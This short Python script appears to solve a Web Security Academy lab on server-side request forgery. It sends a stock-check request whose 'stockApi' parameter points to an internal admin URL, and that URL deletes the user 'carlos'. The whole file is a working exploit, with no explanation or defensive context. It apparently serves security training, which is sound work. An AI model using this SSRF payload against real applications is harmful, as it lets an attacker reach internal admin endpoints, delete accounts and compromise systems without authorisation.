import requests
stock_url = 'https://acb11ff71e7a78c4c06b4b59006b0087.web-security-academy.net/product/stock'

stock_api_data = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
}
resp = requests.post(stock_url, data=stock_api_data)
print(resp.text)